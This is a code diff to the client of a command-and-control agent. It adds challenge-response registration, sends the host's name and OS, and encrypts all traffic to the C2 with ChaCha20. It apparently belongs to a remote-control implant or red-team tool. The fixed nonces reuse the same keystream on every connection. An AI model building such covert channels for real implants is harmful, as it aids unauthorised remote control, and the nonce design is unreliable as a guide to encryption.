@@ -9,14 +9,21 @@ Handles:
 """
 
 import asyncio
+import hashlib
+import hmac
 import logging
 import platform
+import secrets
 import socket
+import time
 from typing import Callable, Optional
 
+from common.crypto import NONCE_AGENT_TO_C2, NONCE_C2_TO_AGENT, ChaCha20, EncryptedStream, derive_key
 from common.protocol import (
     CMD_HEARTBEAT,
     CMD_REGISTER,
+    CMD_REGISTER_CONFIRM,
+    CMD_REGISTER_RESPONSE,
     PacketReader,
     encode_control,
 )
@@ -47,6 +54,7 @@ class AgentClient:
         self._connected = False
         self._on_packet: Optional[Callable] = None
         self._writer: Optional[asyncio.StreamWriter] = None
+        self._stream: Optional[EncryptedStream] = None
         self._write_lock = asyncio.Lock()
         self._hb_task: Optional[asyncio.Task] = None
         self._stopped = False
@@ -109,21 +117,38 @@ class AgentClient:
         self._reader = PacketReader()
         if self._on_packet is not None and hasattr(self._on_packet, "reset"):
             self._on_packet.reset()
-        await self._send_register(writer)
+        if not await self._handshake(reader, writer):
+            logger.warning("registration handshake failed")
+            writer.close()
+            self._writer = None
+            return
+        # Handshake + auth succeeded: switch the whole byte stream to
+        # ChaCha20 encryption keyed by sha256(auth_token).
+        key = derive_key(self._auth_token)
+        tx = ChaCha20(key, NONCE_AGENT_TO_C2)
+        rx = ChaCha20(key, NONCE_C2_TO_AGENT)
+        stream = EncryptedStream(reader, writer, tx, rx)
+        self._stream = stream
+        stream.absorb_leftover(self._reader)
+        if self._reader.buffered:
+            leftover = self._reader.drain_all()
+            if self._on_packet is not None:
+                self._on_packet.feed(leftover)
+                await self._on_packet.process(stream, stream)
         self._connected = True
         logger.info(f"connected to C2 at {self._c2_host}:{self._c2_port}")
 
-        self._hb_task = asyncio.create_task(self._heartbeat_loop(writer))
+        self._hb_task = asyncio.create_task(self._heartbeat_loop(stream))
 
         try:
             while not self._stopped:
-                chunk = await reader.read(4096)
+                chunk = await stream.read(4096)
                 if not chunk:
                     raise ConnectionError("C2 closed connection")
                 if self._on_packet is None:
                     continue
                 self._on_packet.feed(chunk)
-                await self._on_packet.process(reader, writer)
+                await self._on_packet.process(stream, stream)
         finally:
             self._connected = False
             if self._hb_task is not None:
@@ -135,25 +160,73 @@ class AgentClient:
                 self._hb_task = None
             writer.close()
             self._writer = None
+            self._stream = None
 
-    async def _send_register(self, writer: asyncio.StreamWriter) -> None:
+    async def _handshake(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> bool:
+        """Challenge-response registration with the C2.
+
+        Sends a ``register`` packet carrying a random nonce instead of the
+        plaintext token, receives the C2's ``sha256(nonce + c2_auth_tokens)``
+        challenge, verifies it against the locally stored token, then confirms
+        with ``register_confirm``. Returns False (and disconnects) on any
+        verification failure.
+        """
+        nonce = secrets.token_hex(16)
         req_id = self.next_request_id()
         hostname = socket.gethostname()
         os_name = _detect_os()
-        pkt = encode_control(req_id, CMD_REGISTER, [self._agent_id, self._auth_token, hostname, os_name])
+        pkt = encode_control(req_id, CMD_REGISTER, [self._agent_id, nonce, hostname, os_name])
         async with self._write_lock:
             writer.write(pkt)
             await writer.drain()
 
-    async def _heartbeat_loop(self, writer: asyncio.StreamWriter) -> None:
+        expected = await self._receive_register_response(reader)
+        if expected is None:
+            return False
+
+        local = hashlib.sha256((nonce + self._auth_token).encode("utf-8")).hexdigest()
+        if not hmac.compare_digest(local, expected):
+            logger.warning("auth verification failed (token mismatch)")
+            return False
+
+        req_id = self.next_request_id()
+        pkt = encode_control(req_id, CMD_REGISTER_CONFIRM, [self._agent_id])
+        async with self._write_lock:
+            writer.write(pkt)
+            await writer.drain()
+        return True
+
+    async def _receive_register_response(self, reader: asyncio.StreamReader) -> Optional[str]:
+        """Wait for the C2's register_response (challenge hash)."""
+        deadline = time.time() + 30
+        while time.time() < deadline:
+            pkt = self._reader.next_packet()
+            if pkt is not None:
+                _req_id, _body_len, cmd, body = pkt
+                if cmd == CMD_REGISTER_RESPONSE:
+                    return body.decode("utf-8", errors="replace").strip()
+                return None
+            remaining = deadline - time.time()
+            if remaining <= 0:
+                return None
+            try:
+                chunk = await asyncio.wait_for(reader.read(4096), timeout=remaining)
+            except asyncio.TimeoutError:
+                return None
+            if not chunk:
+                return None
+            self._reader.feed(chunk)
+        return None
+
+    async def _heartbeat_loop(self, stream: EncryptedStream) -> None:
         try:
             while True:
                 await asyncio.sleep(self._heartbeat_interval)
                 req_id = self.next_request_id()
                 pkt = encode_control(req_id, CMD_HEARTBEAT, [str(_now())])
                 async with self._write_lock:
-                    writer.write(pkt)
-                    await writer.drain()
+                    stream.write(pkt)
+                    await stream.drain()
         except asyncio.CancelledError:
             return
         except Exception as e:
@@ -172,5 +245,4 @@ def _detect_os() -> str:
 
 
 def _now() -> int:
-    import time
     return int(time.time())
